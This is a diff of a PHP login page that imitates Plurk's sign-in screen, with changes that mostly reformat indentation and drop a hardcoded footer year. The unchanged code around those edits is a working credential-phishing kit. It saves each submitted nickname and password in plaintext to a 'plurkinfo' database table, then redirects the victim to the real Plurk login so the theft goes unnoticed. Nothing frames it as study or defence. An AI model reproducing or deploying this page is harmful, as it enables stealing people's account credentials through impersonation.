@@ -14,22 +14,22 @@ try {
 
   // 2. HANDLE FORM SUBMISSION
   if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    
+
     // Get values using the correct names
     $nickname = $_POST['nickname'] ?? '';
     $password_input = $_POST['password'] ?? '';
 
     if (!empty($nickname) && !empty($password_input)) {
-        // Insert into database
-        $stmt = $pdo->prepare("INSERT INTO plurkinfo (nickname, password_input) VALUES (:nickname, :password_input)");
-        $stmt->execute([
-            ':nickname' => $nickname,
-            ':password_input' => $password_input
-        ]);
+      // Insert into database
+      $stmt = $pdo->prepare("INSERT INTO plurkinfo (nickname, password_input) VALUES (:nickname, :password_input)");
+      $stmt->execute([
+        ':nickname' => $nickname,
+        ':password_input' => $password_input
+      ]);
 
-        // Redirect after saving
-        header("Location: https://www.plurk.com/login?r=");
-        exit;
+      // Redirect after saving
+      header("Location: https://www.plurk.com/login?r=");
+      exit;
     }
   }
 } catch (PDOException $e) {
@@ -1394,20 +1394,20 @@ try {
       <div class="logo pif-plurk"></div>
 
       <!-- main form handling -->
-<form action="index.php" method="post" id="login_form" class="overlay-form">
+      <form action="index.php" method="post" id="login_form" class="overlay-form">
         <div class="input-holder">
           <div id="nick_name">
-              <input type="text" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" />
+            <input type="text" id="input_nick_name" name="nickname" placeholder="Nickname" value="" spellcheck="false" autocomplete="username" />
           </div>
-          
+
           <div id="password">
-              <input type="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" />
+            <input type="password" id="input_password" name="password" placeholder="Password" autocomplete="current-password" />
           </div>
         </div>
-        
+
         <div id="reset_password"><a href="/resetPassword">Forgot your password?</a></div>
         <button type="submit" id="login_submit" class="submit">Login</button>
-        
+
         <div id="term">
           <p>Your login will be remembered for 14 days (or until logout).</p>
         </div>
@@ -1422,7 +1422,7 @@ try {
               <script>
                 document.write(new Date().getFullYear());
               </script>
-              2025<span> Plurk</span>
+              <span> Plurk</span>
             </span>
           </li>
           <li><a href="/aboutUs">About</a></li>
